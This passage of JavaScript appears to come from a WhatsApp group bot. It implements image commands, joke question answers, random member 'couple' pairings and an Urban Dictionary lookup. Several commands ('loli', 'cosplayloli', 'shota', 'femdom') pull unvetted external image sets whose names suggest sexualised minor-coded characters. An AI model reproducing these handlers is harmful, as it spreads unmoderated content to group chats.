        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/tiktokpics/random.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "randomboy":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/tiktokpics/random2.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "thai":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/tiktokpics/thailand.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "vietnamese":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/tiktokpics/vietnam.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "aesthetic":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/aesthetic.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "antiwork":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/antiwork.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "blackpink":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/blackpink.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "bike":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/bike.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "boneka":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/boneka.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "cosplay":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/cosplay.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "cat":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/cat.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "doggo":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/doggo.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "justina":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/justina.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "kayes":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/kayes.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "kpop":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/kpop.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "notnot":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/notnot.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "car":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/car.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "couplepp":
      case "ppcouple":
        {
          let anu = require("./assets/database/media/randompics/ppcouple.json");
          let random = anu[Math.floor(Math.random() * anu.length)];
          OctopusBotzz.sendMessage(
            from,
            {
              image: { url: random.male },
              caption: `Couple pp for male`,
            },
            { quoted: m }
          );
          OctopusBotzz.sendMessage(
            from,
            {
              image: { url: random.female },
              caption: `Couple pp for female`,
            },
            { quoted: m }
          );
        }
        break;
      case "profilepic":
      case "profilepicture":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/profile.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "pubg":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/pubg.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "rose":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/rose.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "ryujin":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/ryujin.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "ulzzangboy":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/ulzzangboy.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "ulzzanggirl":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/ulzzanggirl.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "wallml":
      case "wallpaperml":
      case "mobilelegend":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/wallml.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "wallpaperphone":
      case "wallphone":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/randompics/wallhp.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "remini":
      case "hd":
        {
          if (!quoted) return replyLinkGc(`Where is the picture?`);
          if (!/image/.test(mime))
            return replyLinkGc(
              `Send/Reply Photos With Captions ${prefix + command}`
            );
          await XeonStickWait();
          const { remini } = require("./lib/remini");
          let media = await quoted.download();
          let proses = await remini(media, "enhance");
          OctopusBotzz.sendMessage(
            m.chat,
            { image: proses, caption: mess.success },
            { quoted: m }
          );
        }
        break;
      case "tes":
        {
          const dataUcapan = ucapan();
          console.log(dataUcapan.ucapanWaktu);

          m.reply("success");
          m.reply(dataUcapan.ucapanWaktu);
        }
        break;
      case "define":
        if (!q) return replyLinkGc(`What do you want to define?`);
        try {
          targetfine = await axios.get(
            `http://api.urbandictionary.com/v0/define?term=${q}`
          );
          if (!targetfine) return replyLinkGc(mess.error);
          const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
            .replace(/\[/g, "")
            .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
            .replace(/\[/g, "")
            .replace(/\]/g, "")}`;
          OctopusBotzz.sendMessage(m.chat, { text: reply }, { quoted: m });
        } catch (err) {
          console.log(err);
          return replyLinkGc(`*${q}* isn't a valid text`);
        }
        break;
      case "can":
        {
          if (!text)
            return replyLinkGc(
              `Ask question\n\nExample : ${prefix + command} i dance?`
            );
          let bisa = [`Can`, `Can't`, `Cannot`, `Of Course You Can!!!`];
          let keh = bisa[Math.floor(Math.random() * bisa.length)];
          let jawab = `*Can ${text}*\nAnswer : ${keh}`;
          await replyLinkGc(jawab);
        }
        break;
      case "is":
        {
          if (!text)
            return replyLinkGc(
              `Ask question\n\nExample : ${prefix + command} she virgin?`
            );
          let apa = [`Yes`, `No`, `It Could Be`, `Thats right`];
          let kah = apa[Math.floor(Math.random() * apa.length)];
          let jawab = `*Is ${text}*\nAnswer : ${kah}`;
          await replyLinkGc(jawab);
        }
        break;
      case "when":
        {
          if (!text)
            return replyLinkGc(
              `Ask question\n\nExample : ${
                prefix + command
              } will i get married?`
            );
          let kapan = [
            "5 More Days",
            "10 More Days",
            "15 More Days",
            "20 More Days",
            "25 More Days",
            "30 More Days",
            "35 More Days",
            "40 More Days",
            "45 More Days",
            "50 More Days",
            "55 More Days",
            "60 More Days",
            "65 More Days",
            "70 More Days",
            "75 More Days",
            "80 More Days",
            "85 More Days",
            "90 More Days",
            "100 More Days",
            "5 Months More",
            "10 Months More",
            "15 Months More",
            "20 Months More",
            "25 Months More",
            "30 Months More",
            "35 Months More",
            "40 Months More",
            "45 Months More",
            "50 Months More",
            "55 Months More",
            "60 Months More",
            "65 Months More",
            "70 Months More",
            "75 Months More",
            "80 Months More",
            "85 Months More",
            "90 Months More",
            "100 Months More",
            "1 More Year",
            "2 More Years",
            "3 More Years",
            "4 More Years",
            "5 More Years",
            "Tomorrow",
            "The Day After Tomorrow",
          ];
          let koh = kapan[Math.floor(Math.random() * kapan.length)];
          let jawab = `*${command} ${text}*\nAnswer : ${koh}`;
          await replyLinkGc(jawab);
        }
        break;
      case "what":
        {
          if (!text)
            return replyLinkGc(
              `Ask question\n\nExample : ${prefix + command} is your name?`
            );
          let lel = [
            `Ask Your Gf`,
            `I Dont Know`,
            `I Don't Know, Ask Your Father`,
          ];
          let kah = lel[Math.floor(Math.random() * lel.length)];
          let jawab = `*What ${text}*\nAnswer : ${kah}`;
          await replyLinkGc(jawab);
        }
        break;
      case "where":
        {
          if (!text)
            return replyLinkGc(
              `Ask question\n\nExample : ${prefix + command} is your name?`
            );
          let wherelol = [
            `In the mountain`,
            `On mars`,
            `On moon`,
            `In the jungle`,
            `I dont know ask your mom`,
            `It could be somewhere`,
          ];
          let kah = wherelol[Math.floor(Math.random() * wherelol.length)];
          let jawab = `*Whwre ${text}*\nAnswer : ${kah}`;
          await replyLinkGc(jawab);
        }
        break;
      case "how":
        {
          if (!text)
            return replyLinkGc(
              `Ask question\n\nExample : ${prefix + command} to date girl?`
            );
          let gimana = [
            `Ummm...`,
            `It's Difficult Bro`,
            `Sorry Bot Can't Answer`,
            `Try Searching On Google`,
            `Holy Cow! Really???`,
            `Dizzy Ah😴, don't wanna answer`,
            `Ohhh I See:(`,
            `The Patient, Boss:(`,
            `Really dude 🙄`,
          ];
          let kah = gimana[Math.floor(Math.random() * gimana.length)];
          let jawab = `*How ${text}*\nAnswer : ${kah}`;
          await replyLinkGc(jawab);
        }
        break;
      case "rate":
        {
          if (!text)
            return replyLinkGc(`Example : ${prefix + command} my profile`);
          let ra = [
            "1",
            "2",
            "3",
            "4",
            "5",
            "6",
            "7",
            "8",
            "9",
            "10",
            "11",
            "12",
            "13",
            "14",
            "15",
            "16",
            "17",
            "18",
            "19",
            "20",
            "21",
            "22",
            "23",
            "24",
            "25",
            "26",
            "27",
            "28",
            "29",
            "30",
            "31",
            "32",
            "33",
            "34",
            "35",
            "36",
            "37",
            "38",
            "39",
            "40",
            "41",
            "42",
            "43",
            "44",
            "45",
            "46",
            "47",
            "48",
            "49",
            "50",
            "51",
            "52",
            "53",
            "54",
            "55",
            "56",
            "57",
            "58",
            "59",
            "60",
            "61",
            "62",
            "63",
            "64",
            "65",
            "66",
            "67",
            "68",
            "69",
            "70",
            "71",
            "72",
            "73",
            "74",
            "75",
            "76",
            "77",
            "78",
            "79",
            "80",
            "81",
            "82",
            "83",
            "84",
            "85",
            "86",
            "87",
            "88",
            "89",
            "90",
            "91",
            "92",
            "93",
            "94",
            "95",
            "96",
            "97",
            "98",
            "99",
            "100",
          ];
          let kah = ra[Math.floor(Math.random() * ra.length)];
          let jawab = `*Rate ${text}*\nAnswer : ${kah}%`;
          await replyLinkGc(jawab);
        }
        break;
      case "runtime":
        {
          let lowq = `*The Bot Has Been Online For:*\n*${runtime(
            process.uptime()
          )}*`;
          replyLinkGc(lowq);
        }
        break;
      case "stupidcheck":
      case "uncleancheck":
      case "hotcheck":
      case "smartcheck":
      case "greatcheck":
      case "evilcheck":
      case "dogcheck":
      case "coolcheck":
      case "waifucheck":
        cantik = body.slice(1);
        const okebnh1 = [
          "1",
          "2",
          "3",
          "4",
          "5",
          "6",
          "7",
          "8",
          "9",
          "10",
          "11",
          "12",
          "13",
          "14",
          "15",
          "16",
          "17",
          "18",
          "19",
          "20",
          "21",
          "22",
          "23",
          "24",
          "25",
          "26",
          "27",
          "28",
          "29",
          "30",
          "31",
          "32",
          "33",
          "34",
          "35",
          "36",
          "37",
          "38",
          "39",
          "40",
          "41",
          "42",
          "43",
          "44",
          "45",
          "46",
          "47",
          "48",
          "49",
          "50",
          "51",
          "52",
          "53",
          "54",
          "55",
          "56",
          "57",
          "58",
          "59",
          "60",
          "61",
          "62",
          "63",
          "64",
          "65",
          "66",
          "67",
          "68",
          "69",
          "70",
          "71",
          "72",
          "73",
          "74",
          "75",
          "76",
          "77",
          "78",
          "79",
          "80",
          "81",
          "82",
          "83",
          "84",
          "85",
          "86",
          "87",
          "88",
          "89",
          "90",
          "91",
          "92",
          "93",
          "94",
          "95",
          "96",
          "97",
          "98",
          "99",
          "100",
        ];
        const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)];
        OctopusBotzz.sendMessage(m.chat, { text: xeonkak }, { quoted: m });
        break;
      case "soulmate":
        {
          if (!m.isGroup) return XeonStickGroup();
          let member = participants.map((u) => u.id);
          let me = m.sender;
          let jodoh = member[Math.floor(Math.random() * member.length)];
          OctopusBotzz.sendMessage(
            m.chat,
            {
              text: `👫Your Soulmate Is

@${me.split("@")[0]} ❤️ @${jodoh.split("@")[0]}`,
              contextInfo: {
                mentionedJid: [me, jodoh],
                forwardingScore: 9999999,
                isForwarded: true,
                externalAdReply: {
                  showAdAttribution: true,
                  containsAutoReply: true,
                  title: ` ${global.botname}`,
                  body: `${ownername}`,
                  previewType: "PHOTO",
                  thumbnail: fs.readFileSync(
                    "./OctopusBotzzMedia/theme/oct.jpg"
                  ),
                  thumbnail: fs.readFileSync(
                    `./OctopusBotzzMedia/theme/oct.jpg`
                  ),
                  sourceUrl: `${wagc}`,
                },
              },
            },
            { quoted: m }
          );
        }
        break;
      case "couple":
        {
          if (!m.isGroup) return XeonStickGroup();
          let member = participants.map((u) => u.id);
          let orang = member[Math.floor(Math.random() * member.length)];
          let jodoh = member[Math.floor(Math.random() * member.length)];
          OctopusBotzz.sendMessage(
            m.chat,
            {
              text: `@${orang.split("@")[0]} ❤️ @${jodoh.split("@")[0]}
Cieeee, What's Going On❤️💖👀`,
              contextInfo: {
                mentionedJid: [orang, jodoh],
                forwardingScore: 9999999,
                isForwarded: true,
                externalAdReply: {
                  showAdAttribution: true,
                  containsAutoReply: true,
                  title: ` ${global.botname}`,
                  body: `${ownername}`,
                  previewType: "PHOTO",
                  thumbnail: fs.readFileSync(
                    "./OctopusBotzzMedia/theme/oct.jpg"
                  ),
                  thumbnail: fs.readFileSync(
                    `./OctopusBotzzMedia/theme/oct.jpg`
                  ),
                  sourceUrl: `${wagc}`,
                },
              },
            },
            { quoted: m }
          );
        }
        break;
      case "coffee":
      case "kopi":
        {
          OctopusBotzz.sendMessage(
            m.chat,
            {
              caption: mess.success,
              image: {
                url: "https://coffee.alexflipnote.dev/random",
              },
            },
            { quoted: m }
          );
        }
        break;
      case "wallpaper":
        {
          if (!text) return replyLinkGc("Enter Query Title");
          await XeonStickWait();
          let { wallpaper } = require("./lib/scraper");
          anuwallpep = await wallpaper(text);
          result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)];
          OctopusBotzz.sendMessage(
            m.chat,
            {
              caption: `${themeemoji} Title : ${
                result.title
              }\n${themeemoji} Category : ${
                result.type
              }\n${themeemoji} Detail : ${
                result.source
              }\n${themeemoji} Media Url : ${
                result.image[2] || result.image[1] || result.image[0]
              }`,
              image: { url: result.image[0] },
            },
            { quoted: m }
          );
        }
        break;
      case "wikimedia":
        {
          if (!text) return replyLinkGc("Enter Query Title");
          await XeonStickWait();
          let { wikimedia } = require("./lib/scraper");
          let anumedia = await wikimedia(text);
          result = anumedia[Math.floor(Math.random() * anumedia.length)];
          OctopusBotzz.sendMessage(
            m.chat,
            {
              caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`,
              image: { url: result.image },
            },
            { quoted: m }
          );
        }
        break;
      case "loli":
        {
          let baseUrl = "https://weeb-api.vercel.app/";
          const response = await fetch(baseUrl + command);
          const imageBuffer = await response.buffer(); // Get the image data as a buffer
          OctopusBotzz.sendMessage(
            m.chat,
            {
              image: imageBuffer,
              caption: `Random ${command} for you!✨`,
            },
            { quoted: m }
          );
        }
        break;
      case "waifu":
        {
          let baseUrl = "https://weeb-api.vercel.app/";
          const response = await fetch(baseUrl + command);
          const imageBuffer = await response.buffer(); // Get the image data as a buffer
          OctopusBotzz.sendMessage(
            m.chat,
            {
              image: imageBuffer,
              caption: `Random ${command} for you!✨`,
            },
            { quoted: m }
          );
        }
        break;
      case "neko": {
        let baseUrl = "https://weeb-api.vercel.app/";
        const response = await fetch(baseUrl + command);
        const imageBuffer = await response.buffer(); // Get the image data as a buffer
        OctopusBotzz.sendMessage(
          m.chat,
          {
            image: imageBuffer,
            caption: `Random ${command} for you!✨`,
          },
          { quoted: m }
        );
      }
      case "akira":
      case "akiyama":
      case "ana":
      case "art":
      case "asuna":
      case "ayuzawa":
      case "boruto":
      case "bts":
      case "chiho":
      case "chitoge":
      case "cosplay":
      case "cosplayloli":
      case "cosplaysagiri":
      case "cyber":
      case "deidara":
      case "doraemon":
      case "elaina":
      case "emilia":
      case "erza":
      case "exo":
      case "gamewallpaper":
      case "gremory":
      case "hacker":
      case "hestia":
      case "husbu":
      case "inori":
      case "islamic":
      case "isuzu":
      case "itachi":
      case "itori":
      case "jennie":
      case "jiso":
      case "justina":
      case "kaga":
      case "kagura":
      case "kakasih":
      case "kaori":
      case "cartoon":
      case "shortquote":
      case "keneki":
      case "kotori":
      case "kurumi":
      case "lisa":
      case "loli2":
      case "madara":
      case "megumin":
      case "mikasa":
      case "mikey":
      case "miku":
      case "minato":
      case "mountain":
      case "naruto":
      case "nekonime":
      case "nezuko":
      case "onepiece":
      case "pentol":
      case "pokemon":
      case "programming":
      case "randomnime":
      case "randomnime2":
      case "rize":
      case "rose":
      case "sagiri":
      case "sakura":
      case "sasuke":
      case "satanic":
      case "shina":
      case "shinka":
      case "shinomiya":
      case "shizuka":
      case "shota":
      case "space":
      case "technology":
      case "tejina":
      case "toukachan":
      case "tsunade":
      case "waifu2":
      case "yotsuba":
      case "yuki":
      case "yulibocil":
      case "yumeko":
        {
          await XeonStickWait();
          let heyy;
          if (/akira/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/akira.json"
            );
          if (/akiyama/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/akiyama.json"
            );
          if (/ana/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/ana.json"
            );
          if (/art/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/art.json"
            );
          if (/asuna/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/asuna.json"
            );
          if (/ayuzawa/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/ayuzawa.json"
            );
          if (/boneka/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/boneka.json"
            );
          if (/boruto/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/boruto.json"
            );
          if (/bts/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/bts.json"
            );
          if (/cecan/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/cecan.json"
            );
          if (/chiho/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/chiho.json"
            );
          if (/chitoge/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/chitoge.json"
            );
          if (/cogan/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/cogan.json"
            );
          if (/cosplay/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/cosplay.json"
            );
          if (/cosplayloli/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/cosplayloli.json"
            );
          if (/cosplaysagiri/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/cosplaysagiri.json"
            );
          if (/cyber/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/cyber.json"
            );
          if (/deidara/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/deidara.json"
            );
          if (/doraemon/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/doraemon.json"
            );
          if (/eba/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/eba.json"
            );
          if (/elaina/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/elaina.json"
            );
          if (/emilia/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/emilia.json"
            );
          if (/erza/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/erza.json"
            );
          if (/exo/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/exo.json"
            );
          if (/femdom/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/femdom.json"
            );
          if (/freefire/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/freefire.json"
            );
          if (/gamewallpaper/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/gamewallpaper.json"
            );
          if (/glasses/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/glasses.json"
            );
          if (/gremory/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/gremory.json"
            );
          if (/hacker/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/hekel.json"
            );
          if (/hestia/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/hestia.json"
            );
          if (/husbu/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/husbu.json"
            );
          if (/inori/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/inori.json"
            );
          if (/islamic/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/islamic.json"
            );
          if (/isuzu/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/isuzu.json"
            );
          if (/itachi/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/itachi.json"
            );
          if (/itori/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/itori.json"
            );
          if (/jennie/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/jeni.json"
            );
          if (/jiso/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/jiso.json"
            );
          if (/justina/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/justina.json"
            );
          if (/kaga/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/kaga.json"
            );
          if (/kagura/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/kagura.json"
            );
          if (/kakasih/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/kakasih.json"
            );
          if (/kaori/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/kaori.json"
            );
          if (/cartoon/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/kartun.json"
            );
          if (/shortquote/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/katakata.json"
            );
          if (/keneki/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/keneki.json"
            );
          if (/kotori/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/kotori.json"
            );
          if (/kpop/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/kpop.json"
            );
          if (/kucing/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/kucing.json"
            );
          if (/kurumi/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/kurumi.json"
            );
          if (/lisa/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/lisa.json"
            );
          if (/loli2/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/loli.json"
            );
          if (/madara/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/madara.json"
            );
          if (/megumin/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/megumin.json"
            );
          if (/mikasa/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/mikasa.json"
            );
          if (/mikey/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/mikey.json"
            );
          if (/miku/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/miku.json"
            );
          if (/minato/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/minato.json"
            );
          if (/mobile/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/mobil.json"
            );
          if (/motor/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/motor.json"
            );
          if (/mountain/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/mountain.json"
            );
          if (/naruto/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/naruto.json"
            );
          if (/nekonime/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGXeon/OctopusBotzzMedia/master/nekonime.json"
            );
          if (/nezuko/.test(command))
            heyy = await fetchJson(
